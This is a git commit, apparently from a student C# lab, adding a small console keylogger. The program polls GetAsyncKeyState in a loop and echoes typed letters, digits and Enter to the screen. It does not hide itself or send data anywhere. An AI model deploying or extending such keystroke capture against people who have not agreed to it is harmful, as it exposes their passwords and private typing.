b78356b46af4a2c000e580714a7d90435161600d
pznkv <57153340+pznkv@users.noreply.github.com>
2020-05-19 16:10:07 +0300

    Add files via upload

---
+++ Lab4Csharp/Key_logger/Key_logger/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace MyKeyLogger
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern short GetAsyncKeyState(int _);
+        static void Main()
+        {  
+            while (true)
+            {
+                for (int i = 'A'; i <= 'Z'; i++)
+                    if (GetAsyncKeyState(i) == -32767)
+                        if (GetAsyncKeyState(160) != 0) //160 - shift symbol
+                            Console.Write((char)i);
+                        else
+                            Console.Write((char)(i - 'A' + 'a'));
+
+                for (int i = '0'; i <= '9'; i++)
+                    if (GetAsyncKeyState(i) == -32767)
+                        Console.Write((char)i);
+                if (GetAsyncKeyState(13) == -32767)
+                    Console.WriteLine();
+            }
+        }
+    }
+}
